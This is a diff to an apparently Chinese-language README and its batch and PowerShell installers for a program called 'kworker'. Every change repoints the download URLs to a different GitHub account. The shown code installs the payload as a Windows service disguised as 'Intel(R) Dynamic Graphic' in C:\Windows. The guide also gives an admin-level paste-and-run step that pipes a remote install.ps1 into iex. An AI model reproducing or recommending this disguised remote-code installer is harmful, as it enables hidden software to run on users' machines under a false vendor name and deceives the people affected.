@@ -14,7 +14,7 @@ echo.
 REM 设置变量
 set SERVICE_NAME=Intel(R) Dynamic Graphic
 set INSTALL_DIR=C:\Windows\Intel(R) Dynamic Graphic
-set DOWNLOAD_URL=https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip
+set DOWNLOAD_URL=https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip
 
 REM 检查管理员权限
 net session >nul 2>&1
@@ -144,7 +144,7 @@ pause
 # 设置变量
 $ServiceName = "Intel(R) Dynamic Graphic"
 $InstallDir = "C:\Windows\Intel(R) Dynamic Graphic"
-$DownloadUrl = "https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip"
+$DownloadUrl = "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip"
 $ExeName = "Intel(R) Dynamic Graphic.exe"
 $ConfigName = "c"
 
@@ -327,7 +327,7 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 | **服务名** | `Intel(R) Dynamic Graphic`（与显示名称一致）|
 | **配置文件** | `c`（位于安装目录）|
 | **压缩包** | `kworker.zip`，内含上述两个文件 |
-| **下载路径** | `https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip` |
+| **下载路径** | `https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip` |
 
 ---
 
@@ -338,7 +338,7 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 ```powershell
 # 以管理员身份打开 PowerShell，执行：
 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
-iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wondream322/kworker/master/win/install.ps1').Content
+iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/install.ps1').Content
 ```
 
 ### 方式二：下载后本地执行
